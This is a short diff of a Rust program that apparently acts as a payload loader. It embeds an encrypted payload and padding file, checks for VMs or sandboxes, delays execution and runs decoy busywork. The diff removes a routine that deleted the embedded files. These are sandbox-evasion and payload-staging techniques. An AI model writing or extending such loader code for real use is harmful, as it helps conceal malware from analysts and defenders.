@@ -15,29 +15,6 @@ use busywork::{BusyWork, Categories, Intensity};
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
 static PADDING: &[u8] = include_bytes!("../padding.bin");
 
-fn cleanup_embedded_files() -> Result<(), std::io::Error> {
-    let files = [
-        "../payload.enc",
-        "../padding.bin",
-    ];
-
-    for file in files {
-        match fs::remove_file(file) {
-            Ok(()) => {
-                // File removed successfully.
-            }
-            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
-                // Already removed.
-            }
-            Err(e) => {
-                return Err(e);
-            }
-        }
-    }
-
-    Ok(())
-}
-
 fn vm_detected() -> bool {
     // WARNING: unreliable standalone VM/sandbox check.
     // The crate's heuristics can be outdated, bypassed, or produce
@@ -101,8 +78,6 @@ fn delay_execution() {
 
 fn run() -> Result<(), Box<dyn Error>> {
     std::hint::black_box(&PADDING);
-
-    cleanup_embedded_files().map_err(|e| format!("Failed to clean up embedded files: {e}"))?;
 
     if VM_DETECTION && vm_detected() {
         if VERBOSE {
